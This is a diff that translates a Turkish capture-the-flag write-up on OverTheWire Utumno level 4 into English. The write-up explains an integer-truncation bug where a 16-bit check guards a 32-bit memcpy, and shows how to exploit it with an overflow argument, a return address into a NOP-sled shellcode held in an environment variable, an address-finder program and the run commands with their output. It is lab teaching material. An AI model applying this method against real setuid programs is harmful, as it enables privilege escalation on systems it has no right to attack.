@@ -1,83 +1,83 @@
-# OverTheWire — Utumno Level 4 Çözümü (utumno4 → utumno5)
+# OverTheWire — Utumno Level 4 Solution (utumno4 → utumno5)
 
-> Hedef: `utumno4` kullanıcısından `utumno5` kullanıcısının şifresini elde etmek.
-> Teknik: **integer truncation** (16-bit kontrol vs 32-bit `memcpy`) → dev stack overflow;
-> executable stack'te env-var shellcode + gömülü `cat` komutu.
+> Goal: Get utumno5 user's password from `utumno4`.
+> Technique: **Integer truncation** (16-bit check vs 32-bit `memcpy`) → massive stack overflow;
+> env-var shellcode on executable stack + embedded `cat` command.
 
 ---
 
-## 1. Bağlantı
+## 1. Connection
 
 ```bash
 ssh utumno4@utumno.labs.overthewire.org -p 2227
-# şifre: **********   (bir önceki seviyeden)
+# password: **********   (from the previous level)
 ```
 
 ---
 
-## 2. Keşif (Recon)
+## 2. Recon
 
 ```bash
 ls -la /utumno/utumno4
-# -r-sr-x--- 1 utumno5 utumno4 12784 utumno4   <-- SUID utumno5, grup utumno4 = OKUNABİLİR
+# -r-sr-x--- 1 utumno5 utumno4 12784 utumno4   <-- SUID utumno5, group utumno4 = READABLE
 strings /utumno/utumno4 | grep -E 'atoi|memcpy|protector'
 #   atoi, memcpy
-#   ... -fno-stack-protector ...               <-- canary YOK
+#   ... -fno-stack-protector ...               <-- NO canary
 readelf -l /utumno/utumno4 | grep GNU_STACK
 #   GNU_STACK ... RWE                           <-- stack EXECUTABLE
 ```
-Anahtar fonksiyonlar: **`atoi`** (argv'den sayı) + **`memcpy`** (argv'den kopya). Klasik
-"boyutu kullanıcı veriyor" senaryosu.
+Key functions: **`atoi`** (number from argv) + **`memcpy`** (copy from argv). Classic
+"user supplies the size" scenario.
 
 ---
 
-## 3. Statik Analiz — `main` (integer truncation)
+## 3. Static Analysis — `main` (integer truncation)
 
 ```bash
 objdump -d -M intel /utumno/utumno4 | sed -n '/<main>:/,/^$/p'
 ```
 
-Sözde kod:
+Pseudocode:
 ```c
 int main(int argc, char **argv) {
-    char buf[0xff02];                 // ebp-0xff02 (stack-clash probing ile büyük frame)
-    int  n = atoi(argv[1]);           // [ebp-0x4]  = TAM 32-bit
-    short s = (short)n;               // [ebp-0x6]  = düşük 16 bit
-    if ((unsigned short)s > 0x3f)     // KONTROL sadece düşük 16 bit'e bakıyor
+    char buf[0xff02];                 // ebp-0xff02 (stack-clash probing large frame)
+    int  n = atoi(argv[1]);           // [ebp-0x4]  = full 32-bit
+    short s = (short)n;               // [ebp-0x6]  = low 16 bits
+    if ((unsigned short)s > 0x3f)     // CHECK looks only at low 16 bits
         exit(1);
-    memcpy(buf, argv[2], n);          // ama memcpy TAM 32-bit n kullanıyor  <<< BUG
+    memcpy(buf, argv[2], n);          // but memcpy uses full 32-bit n  <<< BUG
     return 0;
 }
 ```
 
-**Zafiyet (tip karışıklığı / truncation):**
-- Sınır kontrolü `(short)n`'in **düşük 16 bit**'i ile yapılıyor (`<= 0x3f`).
-- `memcpy` uzunluğu ise **tam 32-bit `n`**.
-- `n = 0x10000 (65536)` → düşük 16 bit = `0x0000` ≤ `0x3f` ⇒ **kontrol geçer**, ama
-  `memcpy` **65536 bayt** kopyalar → dev buffer overflow.
+**Vulnerability (type mismatch / truncation):**
+- Bounds check uses **low 16 bits** of `(short)n` (`<= 0x3f`).
+- `memcpy` length uses **full 32-bit `n`**.
+- `n = 0x10000 (65536)` → low 16 bits = `0x0000` ≤ `0x3f` ⇒ **check passes**, but
+  `memcpy` copies **65536 bytes** → massive buffer overflow.
 
-**Offset:** `dest = ebp - 0xff02`, return adresi `ebp+4`. Mesafe = `0xff02 + 4 = 0xff06` (65286).
-`n = 0x10000` → 65536 bayt kopyalanır, `0xff06`'daki return adresini rahatça ezer.
+**Offset:** `dest = ebp - 0xff02`, return address at `ebp+4`. Distance = `0xff02 + 4 = 0xff06` (65286).
+`n = 0x10000` → 65536 bytes copied, easily overwrites return address at `0xff06`.
 
 ---
 
-## 4. Strateji
+## 4. Strategy
 
-`atoi`/`memcpy` argv'den beslendiği için hedefi **`execve`** ile çağıran bir launcher kullan:
+Since `atoi`/`memcpy` are fed from argv, use a **launcher** that calls the target via `execve`:
 - `argv = {"/utumno/utumno4", "65536", BIGARG, NULL}`
-  - `BIGARG` = `0xff06` bayt dolgu + **4 bayt return adresi** + dolgu (toplam `0x10000`).
-- Shellcode'u büyük **NOP sled** ile `EGG` env değişkenine koy (stack RWE, ASLR yok).
-- Return adresi `EGG` sled'inin ortasını gösterir → shellcode → `cat /etc/utumno_pass/utumno5`.
+  - `BIGARG` = `0xff06` bytes padding + **4 bytes return address** + padding (total `0x10000`).
+- Put shellcode with a large **NOP sled** in `EGG` env variable (stack RWE, ASLR off).
+- Return address points to the EGG sled's midpoint → shellcode → `cat /etc/utumno_pass/utumno5`.
 
-### Önemli gözlem — env adresi argv boyutundan etkilenmez
-Linux stack düzeninde **env string'leri en tepede**, argv string'leri onların **altında**.
-Bu yüzden 65536 baytlık dev `argv[2]`, `EGG` env'inin adresini **aşağı itmez** → `environ[0]`
-adresi argv boyutundan bağımsız, sabit. (printer ile bulunan adres doğrudan geçerli.)
+### Key observation — env address is unaffected by argv size
+In the Linux stack layout, **env strings are at the very top**, with argv strings **below** them.
+So even a huge 65536-byte `argv[2]` does **not** shift the `EGG` env address downward →
+`environ[0]` is independent of argv size, stays fixed. (The printer-found address is directly valid.)
 
-### Komutu shellcode'a gömme
-utumno3'teki gibi: stdin yok, komut gömülü. Null-free shellcode
-`/bin/sh -c "cat /etc/utumno_pass/utumno5"`'i stack'te kurar (`utumno4`'ten tek fark:
-komut string'inin son dword'ü `"mno5"` → bayt `0x34`→`0x35`).
+### Embedding the command in shellcode
+Same as utumno3: no stdin, command is embedded. Null-free shellcode runs
+`/bin/sh -c "cat /etc/utumno_pass/utumno5"` on the stack (only difference from utumno4:
+the command string's last dword is `"mno5"` → byte `0x34`→`0x35`).
 
 ---
 
@@ -119,24 +119,24 @@ int main(int argc,char**argv){
 }
 ```
 
-### `pr.c` (env adres bulucu)
+### `pr.c` (env address finder)
 ```c
 #include <stdio.h>
 extern char **environ;
 int main(){ printf("ENVADDR=%p\n",(void*)environ[0]); return 0; }
 ```
 
-### Çalıştırma
+### Execution
 ```bash
 gcc -m32 -o ex4 ex4.c
 gcc -m32 -o /tmp/p2A7xK9mLq pr.c
 
 ENV0=$(./ex4 find | sed -n 's/.*ENVADDR=0x\([0-9a-f]*\).*/\1/p')
-RET=$(python3 -c "print('%x'%(int('$ENV0',16)+4+30000))")   # sled ortası
-./ex4 run "$RET"           # n=65536 -> memcpy taşması -> ret -> sled -> cat
+RET=$(python3 -c "print('%x'%(int('$ENV0',16)+4+30000))")   # sled midpoint
+./ex4 run "$RET"           # n=65536 -> memcpy overflow -> ret -> sled -> cat
 ```
 
-Çıktı:
+Output:
 ```
 ENV0=fffef51f RET=ffff6a53
 **********
@@ -144,28 +144,27 @@ ENV0=fffef51f RET=ffff6a53
 
 ---
 
-## 6. Doğrulama
+## 6. Verification
 
 ```bash
 ssh utumno5@utumno.labs.overthewire.org -p 2227
-# şifre: **********
+# password: **********
 ```
 ```
 uid=16005(utumno5) gid=16005(utumno5) groups=16005(utumno5)
 $ cat /etc/utumno_pass/utumno5
 **********
 ```
-✅ Başarılı.
+✅ Success.
 
 ---
 
-## Özet / Alınan Dersler
+## Summary / Lessons Learned
 
-| Konu | Not |
-|------|-----|
-| **Integer truncation** | Kontrol `(short)n` (16-bit), kullanım `memcpy(...,n)` (32-bit) → uyumsuzluk |
-| **Bypass değeri** | `n = 0x10000` → düşük 16 bit = 0 ≤ 0x3f geçer, ama 65536 bayt kopyalanır |
-| **Offset 0xff06** | `dest = ebp-0xff02`, ret `ebp+4` → mesafe `0xff06` |
-| **env stack'in tepesinde** | argv ne kadar büyük olursa olsun env adresi (EGG) sabit kalır |
-| **Self-contained shellcode** | utumno3 ile aynı yöntem; komut string'inde `utumno4`→`utumno5` |
-
+| Topic | Note |
+|-------|------|
+| **Integer truncation** | Check is `(short)n` (16-bit), usage is `memcpy(...,n)` (32-bit) → mismatch |
+| **Bypass value** | `n = 0x10000` → low 16 bits = 0 ≤ 0x3f passes, but 65536 bytes are copied |
+| **Offset 0xff06** | `dest = ebp-0xff02`, ret at `ebp+4` → distance `0xff06` |
+| **env at top of stack** | No matter how large argv is, env address (EGG) stays fixed |
+| **Self-contained shellcode** | Same approach as utumno3; change `utumno4`→`utumno5` in command string |
